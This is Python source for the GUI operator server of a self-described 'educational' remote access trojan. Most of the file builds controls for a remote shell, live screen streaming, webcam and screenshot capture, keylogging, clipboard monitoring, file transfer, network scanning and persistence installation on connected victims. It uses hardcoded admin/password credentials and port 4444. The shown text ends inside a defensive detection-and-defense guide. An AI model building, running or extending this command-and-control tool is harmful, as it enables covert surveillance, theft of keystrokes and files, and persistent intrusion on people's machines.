#!/usr/bin/env python3
# Educational RAT GUI Server - Full Featured
# For learning purposes only - use in controlled test environments

import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import socket
import os
import sys
import threading
import platform
import time
import json
import logging
import shutil
import re
import subprocess
import io

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from crypto_utils import send_msg, recv_msg, recv_msg_str, derive_key, AES_AVAILABLE
except ImportError:
    AES_AVAILABLE = False
    import struct
    def send_msg(sock, data, key=None):
        if isinstance(data, str): data = data.encode()
        sock.sendall(struct.pack('>I', len(data)) + data)
    def recv_msg(sock, key=None):
        raw = b""
        while len(raw) < 4:
            c = sock.recv(4 - len(raw))
            if not c: return None
            raw += c
        n = struct.unpack('>I', raw)[0]
        if n == 0: return b""
        if n > 50_000_000: return None
        data = b""
        while len(data) < n:
            c = sock.recv(min(65536, n - len(data)))
            if not c: return None
            data += c
        return data
    def recv_msg_str(sock, key=None):
        d = recv_msg(sock, key)
        return d.decode(errors='replace') if d is not None else None
    def derive_key(password): return None

try:
    from PIL import Image, ImageTk
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    from report_generator import PentestReport
    REPORT_AVAILABLE = True
except ImportError:
    REPORT_AVAILABLE = False

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler("server_log.txt"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

AUTH_USERNAME = "admin"
AUTH_PASSWORD = "password"
ENCRYPTION_KEY = "edu_rat_default_key"


class RATServerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Educational RAT Server - EDUCATIONAL USE ONLY")
        self.root.geometry("1200x800")
        self.root.minsize(1000, 700)

        # Palette modernisée — 3 niveaux de profondeur
        self.bg_main       = "#0f1117"   # fond général
        self.bg_sidebar    = "#141824"   # sidebar
        self.bg_card       = "#1a1e2e"   # cards / panels
        self.bg_console    = "#080b10"   # console
        self.bg_input      = "#1e2433"   # inputs
        self.border_color  = "#1e2433"   # bordures subtiles
        self.text_color    = "#eceff4"   # texte principal
        self.text_muted    = "#4c566a"   # texte inactif / labels
        self.accent_color  = "#88c0d0"   # cyan accent
        self.warning_color = "#ebcb8b"   # jaune
        self.error_color   = "#bf616a"   # rouge
        self.success_color = "#a3be8c"   # vert
        self.info_color    = "#5e81ac"   # bleu
        self.orange_color  = "#d08770"   # orange (timeout)
        self.bg_color = self.bg_main     # alias backwards-compat

        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.root.configure(bg=self.bg_main)
        self.style.configure("TFrame",       background=self.bg_main)
        self.style.configure("Card.TFrame",  background=self.bg_card)
        self.style.configure("Sidebar.TFrame", background=self.bg_sidebar)
        self.style.configure("TLabel",       background=self.bg_main,    foreground=self.text_color,   font=("Segoe UI", 10))
        self.style.configure("Muted.TLabel", background=self.bg_main,    foreground=self.text_muted,   font=("Segoe UI", 9))
        self.style.configure("Bold.TLabel",  background=self.bg_main,    foreground=self.text_color,   font=("Segoe UI", 12, "bold"))
        self.style.configure("Header.TLabel",background=self.bg_card,    foreground=self.accent_color, font=("Segoe UI", 14, "bold"))
        self.style.configure("Status.TLabel",background=self.bg_main,    foreground=self.success_color,font=("Segoe UI", 10))
        self.style.configure("Warning.TLabel",background=self.bg_main,   foreground=self.warning_color,font=("Segoe UI", 12, "bold"))
        self.style.configure("Defense.TLabel",background=self.bg_card,   foreground="#81A1C1",         font=("Segoe UI", 10))
        self.style.configure("TButton",      background=self.accent_color,foreground=self.bg_main,     font=("Segoe UI", 9, "bold"), padding=4)
        self.style.map("TButton",
            background=[("active", "#6aafc0"), ("disabled", self.bg_input)],
            foreground=[("disabled", self.text_muted)])
        self.style.configure("Danger.TButton", background=self.error_color, foreground=self.bg_main, font=("Segoe UI", 9, "bold"), padding=4)
        self.style.map("Danger.TButton",
            background=[("active", "#a94452"), ("disabled", self.bg_input)],
            foreground=[("disabled", self.text_muted)])
        self.style.configure("TEntry",       fieldbackground=self.bg_input, foreground=self.text_color, insertcolor=self.text_color, borderwidth=1, relief="flat")
        self.style.configure("TNotebook",    background=self.bg_main)
        self.style.configure("TScrollbar",   background=self.bg_sidebar, troughcolor=self.bg_main, arrowcolor=self.text_muted)

        self.clients = {}
        self.current_client_id = None
        self.server_socket = None
        self.stop_flag = threading.Event()
        self.lock = threading.Lock()
        self.streaming = False
        self._sidebar_buttons = {}      # slug -> (frame, icon_lbl, text_lbl)
        self._content_frames = {}       # slug -> frame contenu
        self._active_section = None     # slug actif
        self._notif_widgets = []        # widgets notification actifs

        self.server_host = tk.StringVar(value="0.0.0.0")
        self.server_port = tk.IntVar(value=4444)
        self.build_exe_var = tk.BooleanVar(value=False)
        self.lan_mode_var = tk.BooleanVar(value=True)
        self.auth_username_var = tk.StringVar(value=AUTH_USERNAME)
        self.auth_password_var = tk.StringVar(value=AUTH_PASSWORD)
        self.auto_generate_var = tk.BooleanVar(value=True)
        self.save_to_builds_var = tk.BooleanVar(value=True)

        self.status_var = tk.StringVar(value="Server: Stopped")
        self.count_var = tk.StringVar(value="Clients: 0")

        self.screenshots = []
        self.current_screenshot_index = 0
        self.screenshot_photo = None
        self.webcam_images = []
        self.current_webcam_index = 0
        self.webcam_photo = None
        self.stream_photo = None

        if REPORT_AVAILABLE:
            self.report = PentestReport()
        else:
            self.report = None

        self._build_ui()
        self.log_message("Educational RAT Server - All features loaded", "info")
        self.log_message(f"Encryption: {'AES-256 available' if AES_AVAILABLE else 'Fallback (no pycryptodome)'}", "info")
        self.log_message(f"Report generator: {'Available' if REPORT_AVAILABLE else 'Unavailable (pip install fpdf2)'}", "info")
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def _build_ui(self):
        self._build_titlebar()
        body = tk.Frame(self.root, bg=self.bg_main)
        body.pack(fill="both", expand=True)
        self._build_sidebar(body)
        self._build_content_area(body)
        self._setup_dashboard(self._content_frames["dashboard"])
        self._setup_terminal(self._content_frames["terminal"])
        self._setup_clients(self._content_frames["clients"])
        self._setup_stream(self._content_frames["stream"])
        self._setup_screenshots(self._content_frames["screenshots"])
        self._setup_webcam(self._content_frames["webcam"])
        self._setup_keylogger(self._content_frames["keylogger"])
        self._setup_clipboard(self._content_frames["clipboard"])
        self._setup_files(self._content_frames["files"])
        self._setup_scanner(self._content_frames["scanner"])
        self._setup_persistence(self._content_frames["persistence"])
        self._setup_sysinfo(self._content_frames["sysinfo"])
        self._setup_settings(self._content_frames["settings"])
        self._setup_defense(self._content_frames["defense"])
        self._setup_report(self._content_frames["report"])
        self._setup_help(self._content_frames["help"])
        self._show_section("dashboard")

    def _build_titlebar(self):
        bar = tk.Frame(self.root, bg="#0a0d13", height=36)
        bar.pack(fill="x")
        bar.pack_propagate(False)
        left = tk.Frame(bar, bg="#0a0d13")
        left.pack(side="left", padx=12, fill="y")
        tk.Label(left, text="⬡", fg=self.error_color, bg="#0a0d13",
                 font=("Segoe UI", 14)).pack(side="left", pady=6)
        tk.Label(left, text="EduRAT Console", fg=self.text_color, bg="#0a0d13",
                 font=("Segoe UI", 11, "bold")).pack(side="left", padx=6, pady=6)
        self._status_badge = tk.Label(left, text="● ARRÊTÉ", fg=self.error_color,
                                       bg="#0a0d13", font=("Segoe UI", 8),
                                       padx=7, pady=1)
        self._status_badge.pack(side="left", padx=4)
        right = tk.Frame(bar, bg="#0a0d13")
        right.pack(side="right", padx=12, fill="y")
        self._clients_badge = tk.Label(right, text="0 clients", fg=self.text_muted,
                                        bg="#0a0d13", font=("Segoe UI", 9))
        self._clients_badge.pack(side="right", pady=6)
        self._port_badge = tk.Label(right, text=":4444", fg=self.accent_color,
                                     bg=self.bg_input, font=("Consolas", 8),
                                     padx=6, pady=2)
        self._port_badge.pack(side="right", padx=8, pady=6)
        self._alert_badge = tk.Label(right, text="", fg=self.warning_color,
                                      bg="#0a0d13", font=("Segoe UI", 8),
                                      padx=7, pady=1)
        self._alert_badge.pack(side="right", padx=4)
        self._alert_count = 0

    def _build_sidebar(self, parent):
        sidebar = tk.Frame(parent, bg=self.bg_sidebar, width=165)
        sidebar.pack(side="left", fill="y")
        sidebar.pack_propagate(False)
        sep = tk.Frame(parent, bg=self.border_color, width=1)
        sep.pack(side="left", fill="y")
        groups = [
            ("CONTRÔLE", [
                ("dashboard",   "⚡", "Dashboard"),
                ("terminal",    "\U0001f5a5", "Terminal"),
                ("clients",     "\U0001f465", "Clients"),
            ]),
            ("SURVEILLANCE", [
                ("stream",      "\U0001f4fa", "Écran / Stream"),
                ("screenshots", "\U0001f4f8", "Screenshots"),
                ("webcam",      "\U0001f4f7", "Webcam"),
                ("keylogger",   "⌨", "Keylogger"),
                ("clipboard",   "\U0001f4cb", "Presse-papier"),
            ]),
            ("FICHIERS", [
                ("files",       "\U0001f4c2", "Transfert"),
            ]),
            ("RÉSEAU & SYSTÈME", [
                ("scanner",     "\U0001f310", "Scanner réseau"),
                ("persistence", "\U0001f512", "Persistance"),
                ("sysinfo",     "\U0001f4bb", "Info système"),
            ]),
        ]
        bottom_items = [
            ("settings",  "⚙", "Paramètres"),
            ("defense",   "\U0001f6e1", "Défense"),
            ("report",    "\U0001f4c4", "Rapports"),
            ("help",      "❓", "Aide"),
        ]
        scroll_frame = tk.Frame(sidebar, bg=self.bg_sidebar)
        scroll_frame.pack(fill="both", expand=True, pady=6)
        for group_label, items in groups:
            tk.Label(scroll_frame, text=group_label, fg=self.text_muted,
                     bg=self.bg_sidebar, font=("Segoe UI", 7),
                     anchor="w", padx=10).pack(fill="x", pady=(8, 2))
            for slug, icon, label in items:
                self._make_sidebar_item(scroll_frame, slug, icon, label)
        tk.Frame(sidebar, bg=self.border_color, height=1).pack(fill="x", pady=4)
        bottom_frame = tk.Frame(sidebar, bg=self.bg_sidebar)
        bottom_frame.pack(fill="x", pady=2)
        for slug, icon, label in bottom_items:
            self._make_sidebar_item(bottom_frame, slug, icon, label)

    def _make_sidebar_item(self, parent, slug, icon, label):
        frame = tk.Frame(parent, bg=self.bg_sidebar, cursor="hand2")
        frame.pack(fill="x", padx=6, pady=1)
        icon_lbl = tk.Label(frame, text=icon, bg=self.bg_sidebar,
                            fg=self.text_muted, font=("Segoe UI", 10), width=2)
        icon_lbl.pack(side="left", padx=(4, 2), pady=4)
        text_lbl = tk.Label(frame, text=label, bg=self.bg_sidebar,
                            fg=self.text_muted, font=("Segoe UI", 9), anchor="w")
        text_lbl.pack(side="left", fill="x", expand=True, pady=4)
        for widget in (frame, icon_lbl, text_lbl):
            widget.bind("<Button-1>", lambda e, s=slug: self._show_section(s))
            widget.bind("<Enter>",    lambda e, f=frame, il=icon_lbl, tl=text_lbl: self._sidebar_hover(f, il, tl, True))
            widget.bind("<Leave>",    lambda e, f=frame, il=icon_lbl, tl=text_lbl, s=slug: self._sidebar_hover(f, il, tl, False, s))
        self._sidebar_buttons[slug] = (frame, icon_lbl, text_lbl)

    def _sidebar_hover(self, frame, icon_lbl, text_lbl, entering, slug=None):
        if slug and slug == self._active_section:
            return
        bg = self.bg_input if entering else self.bg_sidebar
        fg = self.text_color if entering else self.text_muted
        frame.config(bg=bg)
        icon_lbl.config(bg=bg, fg=fg)
        text_lbl.config(bg=bg, fg=fg)

    def _build_content_area(self, parent):
        content_outer = tk.Frame(parent, bg=self.bg_main)
        content_outer.pack(side="left", fill="both", expand=True)
        self._notif_zone = tk.Frame(content_outer, bg=self.bg_main)
        self._notif_zone.pack(fill="x", padx=10, pady=(6, 0))
        self._content_stack = tk.Frame(content_outer, bg=self.bg_main)
        self._content_stack.pack(fill="both", expand=True, padx=10, pady=6)
        slugs = ["dashboard", "terminal", "clients", "stream", "screenshots",
                 "webcam", "keylogger", "clipboard", "files", "scanner",
                 "persistence", "sysinfo", "settings", "defense", "report", "help"]
        for slug in slugs:
            f = tk.Frame(self._content_stack, bg=self.bg_main)
            f.place(relwidth=1, relheight=1)
            f.lower()
            self._content_frames[slug] = f

    def _show_section(self, slug):
        if self._active_section and self._active_section in self._sidebar_buttons:
            frame, icon_lbl, text_lbl = self._sidebar_buttons[self._active_section]
            frame.config(bg=self.bg_sidebar)
            icon_lbl.config(bg=self.bg_sidebar, fg=self.text_muted)
            text_lbl.config(bg=self.bg_sidebar, fg=self.text_muted)
        self._active_section = slug
        if slug in self._sidebar_buttons:
            frame, icon_lbl, text_lbl = self._sidebar_buttons[slug]
            frame.config(bg=self.bg_input)
            icon_lbl.config(bg=self.bg_input, fg=self.accent_color)
            text_lbl.config(bg=self.bg_input, fg=self.text_color)
        if slug in self._content_frames:
            self._content_frames[slug].lift()

    # ═══════════════════════════════════════════════════════════════════
    # DASHBOARD
    # ═══════════════════════════════════════════════════════════════════

    def _setup_dashboard(self, parent):
        parent.configure(bg=self.bg_main)
        stats_row = tk.Frame(parent, bg=self.bg_main)
        stats_row.pack(fill="x", pady=(0, 8))
        self._stat_clients = self._make_stat_card(stats_row, "0", "CLIENTS",    self.success_color)
        self._stat_server  = self._make_stat_card(stats_row, "OFF", "SERVEUR",  self.error_color)
        self._stat_alerts  = self._make_stat_card(stats_row, "0", "ALERTES",    self.warning_color)
        self._stat_port    = self._make_stat_card(stats_row, "4444", "PORT",     self.accent_color)

        clients_frame = tk.Frame(parent, bg=self.bg_card,
                                  highlightbackground=self.border_color, highlightthickness=1)
        clients_frame.pack(fill="x", pady=(0, 8))
        tk.Label(clients_frame, text="CLIENTS CONNECTÉS", fg=self.text_muted,
                 bg=self.bg_card, font=("Segoe UI", 7), anchor="w",
                 padx=10).pack(fill="x", pady=(6, 2))
        lf = tk.Frame(clients_frame, bg=self.bg_card)
        lf.pack(fill="both", expand=True, padx=8, pady=(0, 8))
        self.client_listbox = tk.Listbox(lf, bg=self.bg_input, fg=self.text_color,
                                          font=("Consolas", 9), selectbackground=self.accent_color,
                                          selectforeground=self.bg_main, borderwidth=0,
                                          highlightthickness=0, activestyle="none")
        self.client_listbox.pack(side="left", fill="both", expand=True)
        sb = tk.Scrollbar(lf, orient="vertical", command=self.client_listbox.yview,
                           bg=self.bg_sidebar, troughcolor=self.bg_main)
        sb.pack(side="right", fill="y")
        self.client_listbox.config(yscrollcommand=sb.set)

        btn_row = tk.Frame(clients_frame, bg=self.bg_card)
        btn_row.pack(fill="x", padx=8, pady=(0, 8))
        ttk.Button(btn_row, text="Actualiser",   command=self.refresh_clients).pack(side="left", padx=3)
        ttk.Button(btn_row, text="Connecter",    command=self.connect_to_client).pack(side="left", padx=3)
        ttk.Button(btn_row, text="Déconnecter", command=self.disconnect_client,
                   style="Danger.TButton").pack(side="left", padx=3)
        self.start_btn = ttk.Button(btn_row, text="▶ Démarrer serveur", command=self.start_server)
        self.start_btn.pack(side="right", padx=3)
        self.stop_btn = ttk.Button(btn_row, text="■ Arrêter", command=self.stop_server,
                                    state="disabled", style="Danger.TButton")
        self.stop_btn.pack(side="right", padx=3)

        console_frame = tk.Frame(parent, bg=self.bg_card,
                                  highlightbackground=self.border_color, highlightthickness=1)
        console_frame.pack(fill="both", expand=True)
        tk.Label(console_frame, text="CONSOLE", fg=self.text_muted, bg=self.bg_card,
                 font=("Segoe UI", 7), anchor="w", padx=10).pack(fill="x", pady=(6, 2))
        self.console = tk.Text(console_frame, wrap="word", bg=self.bg_console,
                                fg=self.text_color, font=("Consolas", 9),
                                borderwidth=0, highlightthickness=0, state="disabled")
        csb = tk.Scrollbar(console_frame, orient="vertical", command=self.console.yview)
        csb.pack(side="right", fill="y")
        self.console.config(yscrollcommand=csb.set)
        self.console.pack(fill="both", expand=True, padx=8, pady=(0, 6))

    def _make_stat_card(self, parent, value, label, color):
        card = tk.Frame(parent, bg=self.bg_card,
                        highlightbackground=self.border_color, highlightthickness=1)
        card.pack(side="left", fill="both", expand=True, padx=(0, 6))
        val_lbl = tk.Label(card, text=value, fg=color, bg=self.bg_card,
                            font=("Segoe UI", 20, "bold"))
        val_lbl.pack(pady=(10, 2))
        tk.Label(card, text=label, fg=self.text_muted, bg=self.bg_card,
                 font=("Segoe UI", 7)).pack(pady=(0, 10))
        return val_lbl

    # ═══════════════════════════════════════════════════════════════════
    # TERMINAL
    # ═══════════════════════════════════════════════════════════════════

    def _setup_terminal(self, parent):
        parent.configure(bg=self.bg_main)
        hdr = tk.Frame(parent, bg=self.bg_main)
        hdr.pack(fill="x", pady=(0, 8))
        tk.Label(hdr, text="Terminal", fg=self.accent_color, bg=self.bg_main,
                 font=("Segoe UI", 13, "bold")).pack(side="left")
        tk.Label(hdr, text="Envoie des commandes au client sélectionné",
                 fg=self.text_muted, bg=self.bg_main, font=("Segoe UI", 9)).pack(side="left", padx=10)
        out_frame = tk.Frame(parent, bg=self.bg_card,
                              highlightbackground=self.border_color, highlightthickness=1)
        out_frame.pack(fill="both", expand=True, pady=(0, 8))
        self.terminal_out = tk.Text(out_frame, wrap="word", bg=self.bg_console,
                                     fg=self.text_color, font=("Consolas", 10),
                                     borderwidth=0, highlightthickness=0, state="disabled")
        tsb = tk.Scrollbar(out_frame, orient="vertical", command=self.terminal_out.yview)
        tsb.pack(side="right", fill="y")
        self.terminal_out.config(yscrollcommand=tsb.set)
        self.terminal_out.pack(fill="both", expand=True, padx=6, pady=6)
        input_frame = tk.Frame(parent, bg=self.bg_card,
                                highlightbackground=self.border_color, highlightthickness=1)
        input_frame.pack(fill="x")
        tk.Label(input_frame, text="$", fg=self.success_color, bg=self.bg_card,
                 font=("Consolas", 12), padx=8).pack(side="left")
        self.cmd_entry = ttk.Entry(input_frame, font=("Consolas", 10))
        self.cmd_entry.pack(side="left", fill="x", expand=True, pady=6)
        self.cmd_entry.bind("<Return>", self.send_command)
        ttk.Button(input_frame, text="Envoyer", command=self.send_command).pack(side="right", padx=8, pady=6)

    # ═══════════════════════════════════════════════════════════════════
    # CLIENTS
    # ═══════════════════════════════════════════════════════════════════

    def _setup_clients(self, parent):
        parent.configure(bg=self.bg_main)
        tk.Label(parent, text="Clients connectés", fg=self.accent_color, bg=self.bg_main,
                 font=("Segoe UI", 13, "bold")).pack(anchor="w", pady=(0, 8))
        frame = tk.Frame(parent, bg=self.bg_card,
                          highlightbackground=self.border_color, highlightthickness=1)
        frame.pack(fill="both", expand=True)
        tk.Label(frame, text="Sélectionne un client pour l’activer, puis utilise les autres sections.",
                 fg=self.text_muted, bg=self.bg_card, font=("Segoe UI", 9),
                 anchor="w", padx=10).pack(fill="x", pady=(8, 4))
        self._clients_detail_text = tk.Text(frame, bg=self.bg_console, fg=self.text_color,
                                             font=("Consolas", 9), borderwidth=0,
                                             highlightthickness=0, state="disabled")
        self._clients_detail_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))


    # ═══════════════════════════════════════════════════════════════════
    # LIVE STREAM
    # ═══════════════════════════════════════════════════════════════════

    def _setup_stream(self, parent):
        ctrl = ttk.Frame(parent)
        ctrl.pack(fill="x", padx=10, pady=10)
        self.stream_start_btn = ttk.Button(ctrl, text="Start Stream", command=self.start_stream)
        self.stream_start_btn.pack(side=tk.LEFT, padx=5)
        self.stream_stop_btn = ttk.Button(ctrl, text="Stop Stream", command=self.stop_stream, state="disabled")
        self.stream_stop_btn.pack(side=tk.LEFT, padx=5)
        self.stream_fps_label = ttk.Label(ctrl, text="FPS: --", style="Status.TLabel")
        self.stream_fps_label.pack(side=tk.RIGHT, padx=10)

        self.stream_canvas = tk.Canvas(parent, bg="#1a1a2e", highlightthickness=0)
        self.stream_canvas.pack(fill="both", expand=True, padx=10, pady=10)

    # ═══════════════════════════════════════════════════════════════════
    # FILE OPERATIONS
    # ═══════════════════════════════════════════════════════════════════

    def _setup_files(self, parent):
        panel = ttk.Frame(parent)
        panel.pack(fill="both", expand=True, padx=5, pady=5)

        left = ttk.Frame(panel)
        left.pack(side=tk.LEFT, fill="both", expand=True, padx=5)
        ttk.Label(left, text="Local Files", style="Header.TLabel").pack(anchor="w")
        pf = ttk.Frame(left)
        pf.pack(fill="x", pady=3)
        self.local_path_var = tk.StringVar(value=os.getcwd())
        ttk.Entry(pf, textvariable=self.local_path_var, width=30).pack(side=tk.LEFT, fill="x", expand=True)
        ttk.Button(pf, text="Browse", command=self.browse_local_dir).pack(side=tk.RIGHT)
        lf = ttk.Frame(left)
        lf.pack(fill="both", expand=True, pady=3)
        self.local_files = tk.Listbox(lf, bg="#3B4252", fg=self.text_color, font=("Segoe UI", 9))
        self.local_files.pack(side=tk.LEFT, fill="both", expand=True)
        ttk.Button(left, text="Refresh", command=self.refresh_local_files).pack(anchor="w", pady=3)

        mid = ttk.Frame(panel, width=80)
        mid.pack(side=tk.LEFT, fill="y", padx=5)
        ttk.Label(mid, text="Transfer", style="Bold.TLabel").pack(pady=10)
        ttk.Button(mid, text="Upload >>", command=self.upload_file).pack(pady=5)
        ttk.Button(mid, text="<< Download", command=self.download_file).pack(pady=5)

        right = ttk.Frame(panel)
        right.pack(side=tk.RIGHT, fill="both", expand=True, padx=5)
        ttk.Label(right, text="Remote Files", style="Header.TLabel").pack(anchor="w")
        rpf = ttk.Frame(right)
        rpf.pack(fill="x", pady=3)
        self.remote_path_var = tk.StringVar(value=".")
        ttk.Entry(rpf, textvariable=self.remote_path_var, width=30).pack(side=tk.LEFT, fill="x", expand=True)
        ttk.Button(rpf, text="List", command=self.list_remote_files).pack(side=tk.RIGHT)
        rf = ttk.Frame(right)
        rf.pack(fill="both", expand=True, pady=3)
        self.remote_files = tk.Listbox(rf, bg="#3B4252", fg=self.text_color, font=("Segoe UI", 9))
        self.remote_files.pack(side=tk.LEFT, fill="both", expand=True)
        ttk.Button(right, text="Refresh", command=self.list_remote_files).pack(anchor="w", pady=3)

        self.refresh_local_files()

    # ═══════════════════════════════════════════════════════════════════
    # SCREENSHOTS
    # ═══════════════════════════════════════════════════════════════════

    def _setup_screenshots(self, parent):
        ctrl = ttk.Frame(parent)
        ctrl.pack(fill="x", padx=10, pady=5)
        ttk.Button(ctrl, text="Capture", command=self.capture_screenshot).pack(side=tk.LEFT, padx=5)
        ttk.Button(ctrl, text="Save", command=self.save_screenshot).pack(side=tk.LEFT, padx=5)
        self.ss_canvas = tk.Canvas(parent, bg="#2E3440", highlightthickness=0)
        self.ss_canvas.pack(fill="both", expand=True, padx=10, pady=5)
        nav = ttk.Frame(parent)
        nav.pack(fill="x", padx=10, pady=5)
        ttk.Button(nav, text="< Prev", command=self.prev_screenshot).pack(side=tk.LEFT)
        self.ss_label = ttk.Label(nav, text="No screenshots")
        self.ss_label.pack(side=tk.LEFT, padx=20)
        ttk.Button(nav, text="Next >", command=self.next_screenshot).pack(side=tk.LEFT)

    # ═══════════════════════════════════════════════════════════════════
    # SYSINFO
    # ═══════════════════════════════════════════════════════════════════

    def _setup_sysinfo(self, parent):
        ctrl = ttk.Frame(parent)
        ctrl.pack(fill="x", padx=10, pady=5)
        ttk.Button(ctrl, text="Refresh Info", command=self.get_system_info).pack(side=tk.LEFT, padx=5)
        ttk.Button(ctrl, text="Get Capabilities", command=self.get_capabilities).pack(side=tk.LEFT, padx=5)
        self.sysinfo_text = scrolledtext.ScrolledText(parent, bg="#3B4252", fg=self.text_color, font=("Consolas", 10))
        self.sysinfo_text.pack(fill="both", expand=True, padx=10, pady=5)
        self.sysinfo_text.config(state="disabled")

    # ═══════════════════════════════════════════════════════════════════
    # WEBCAM
    # ═══════════════════════════════════════════════════════════════════

    def _setup_webcam(self, parent):
        ctrl = ttk.Frame(parent)
        ctrl.pack(fill="x", padx=10, pady=5)
        ttk.Button(ctrl, text="Capture", command=self.capture_webcam).pack(side=tk.LEFT, padx=5)
        ttk.Button(ctrl, text="Save", command=self.save_webcam).pack(side=tk.LEFT, padx=5)
        self.wc_canvas = tk.Canvas(parent, bg="#2E3440", highlightthickness=0)
        self.wc_canvas.pack(fill="both", expand=True, padx=10, pady=5)
        nav = ttk.Frame(parent)
        nav.pack(fill="x", padx=10, pady=5)
        ttk.Button(nav, text="< Prev", command=lambda: self._nav_webcam(-1)).pack(side=tk.LEFT)
        self.wc_label = ttk.Label(nav, text="No images")
        self.wc_label.pack(side=tk.LEFT, padx=20)
        ttk.Button(nav, text="Next >", command=lambda: self._nav_webcam(1)).pack(side=tk.LEFT)

    # ═══════════════════════════════════════════════════════════════════
    # KEYLOGGER
    # ═══════════════════════════════════════════════════════════════════

    def _setup_keylogger(self, parent):
        ctrl = ttk.Frame(parent)
        ctrl.pack(fill="x", padx=10, pady=5)
        ttk.Button(ctrl, text="Start", command=lambda: self._cmd_thread("keylogger_start")).pack(side=tk.LEFT, padx=3)
        ttk.Button(ctrl, text="Stop", command=lambda: self._cmd_thread("keylogger_stop")).pack(side=tk.LEFT, padx=3)
        ttk.Button(ctrl, text="Dump", command=self.dump_keylogger).pack(side=tk.LEFT, padx=3)
        ttk.Button(ctrl, text="Save", command=self.save_keylogger).pack(side=tk.LEFT, padx=3)
        self.keylog_text = scrolledtext.ScrolledText(parent, bg="#3B4252", fg=self.text_color, font=("Consolas", 10))
        self.keylog_text.pack(fill="both", expand=True, padx=10, pady=5)

    # ═══════════════════════════════════════════════════════════════════
    # CLIPBOARD
    # ═══════════════════════════════════════════════════════════════════

    def _setup_clipboard(self, parent):
        ctrl = ttk.Frame(parent)
        ctrl.pack(fill="x", padx=10, pady=5)
        ttk.Button(ctrl, text="Start Monitor", command=lambda: self._cmd_thread("clipboard_start")).pack(side=tk.LEFT, padx=3)
        ttk.Button(ctrl, text="Stop Monitor", command=lambda: self._cmd_thread("clipboard_stop")).pack(side=tk.LEFT, padx=3)
        ttk.Button(ctrl, text="Dump History", command=self.dump_clipboard).pack(side=tk.LEFT, padx=3)
        ttk.Button(ctrl, text="Get Current", command=self.get_current_clipboard).pack(side=tk.LEFT, padx=3)
        self.clipboard_text = scrolledtext.ScrolledText(parent, bg="#3B4252", fg=self.text_color, font=("Consolas", 10))
        self.clipboard_text.pack(fill="both", expand=True, padx=10, pady=5)

    # ═══════════════════════════════════════════════════════════════════
    # NETWORK SCANNER
    # ═══════════════════════════════════════════════════════════════════

    def _setup_scanner(self, parent):
        ctrl = ttk.Frame(parent)
        ctrl.pack(fill="x", padx=10, pady=5)
        ttk.Button(ctrl, text="Full Network Scan", command=self.do_network_scan).pack(side=tk.LEFT, padx=3)
        ttk.Button(ctrl, text="ARP Table", command=self.do_arp_scan).pack(side=tk.LEFT, padx=3)
        ttk.Label(ctrl, text="Target IP:").pack(side=tk.LEFT, padx=(15, 3))
        self.scan_target = ttk.Entry(ctrl, width=15)
        self.scan_target.pack(side=tk.LEFT, padx=3)
        ttk.Button(ctrl, text="Port Scan", command=self.do_port_scan).pack(side=tk.LEFT, padx=3)

        self.scanner_text = scrolledtext.ScrolledText(parent, bg="#3B4252", fg=self.text_color, font=("Consolas", 10))
        self.scanner_text.pack(fill="both", expand=True, padx=10, pady=5)

    # ═══════════════════════════════════════════════════════════════════
    # PERSISTENCE
    # ═══════════════════════════════════════════════════════════════════

    def _setup_persistence(self, parent):
        ctrl = ttk.Frame(parent)
        ctrl.pack(fill="x", padx=10, pady=5)
        ttk.Button(ctrl, text="Check Status", command=lambda: self._cmd_thread("persist_check")).pack(side=tk.LEFT, padx=3)
        ttk.Button(ctrl, text="List Methods", command=lambda: self._cmd_thread("persist_methods")).pack(side=tk.LEFT, padx=3)
        ttk.Button(ctrl, text="Install Default", command=lambda: self._cmd_thread("persist_install")).pack(side=tk.LEFT, padx=3)
        ttk.Button(ctrl, text="Remove", command=lambda: self._cmd_thread("persist_remove")).pack(side=tk.LEFT, padx=3)

        ttk.Label(parent, text="Method:", style="TLabel").pack(anchor="w", padx=10, pady=(10, 0))
        self.persist_method = ttk.Entry(parent, width=30)
        self.persist_method.pack(anchor="w", padx=10, pady=3)
        ttk.Button(parent, text="Install Specific Method", command=self.install_specific_persist).pack(anchor="w", padx=10, pady=3)

        self.persist_text = scrolledtext.ScrolledText(parent, bg="#3B4252", fg=self.text_color, font=("Consolas", 10))
        self.persist_text.pack(fill="both", expand=True, padx=10, pady=5)

    # ═══════════════════════════════════════════════════════════════════
    # DEFENSE PANEL
    # ═══════════════════════════════════════════════════════════════════

    def _setup_defense(self, parent):
        ttk.Label(parent, text="Defense & Detection Guide", style="Header.TLabel").pack(anchor="w", padx=10, pady=10)
        ttk.Label(parent, text="How to DETECT and DEFEND against each feature of this RAT:", style="Defense.TLabel").pack(anchor="w", padx=10)

        defense_info = """
=== DETECTION & DEFENSE GUIDE ===

1. NETWORK CONNECTIONS (C2 Communication)
   Detection: Monitor outbound connections on unusual ports (4444, etc.)
   Tools: Wireshark, netstat, TCPView, Windows Firewall logs
   Defense: Egress filtering, IDS/IPS rules, DNS monitoring
   Command: netstat -ano | findstr :4444

2. SCREENSHOT CAPTURE
   Detection: Monitor API calls to BitBlt/CopyFromScreen
   Tools: Process Monitor (Sysinternals), API monitoring
   Defense: Application whitelisting, screen capture notifications

3. KEYLOGGER
   Detection: Monitor SetWindowsHookEx / keyboard hook APIs
   Tools: Process Monitor, HookAnalyzer, anti-keylogger software
   Defense: Virtual keyboards, keystroke encryption drivers

4. WEBCAM ACCESS
   Detection: Monitor DirectShow/V4L2 API access, LED indicator
   Tools: Process Explorer (check handles to camera device)
   Defense: Camera privacy covers, device access policies

5. PERSISTENCE
   Detection: Monitor registry Run keys, Startup folder, Task Scheduler
   Tools: Autoruns (Sysinternals), HKLM/HKCU Run key monitoring
   Defense: Registry auditing, GPO restrictions, EDR

6. FILE OPERATIONS
   Detection: File integrity monitoring, unusual file access patterns
   Tools: OSSEC, Tripwire, Windows Audit Policy
   Defense: DLP solutions, file access auditing

7. CLIPBOARD MONITORING
   Detection: Monitor OpenClipboard/GetClipboardData API calls
   Tools: API Monitor, Process Monitor
   Defense: Clipboard managers with history, clearing sensitive data

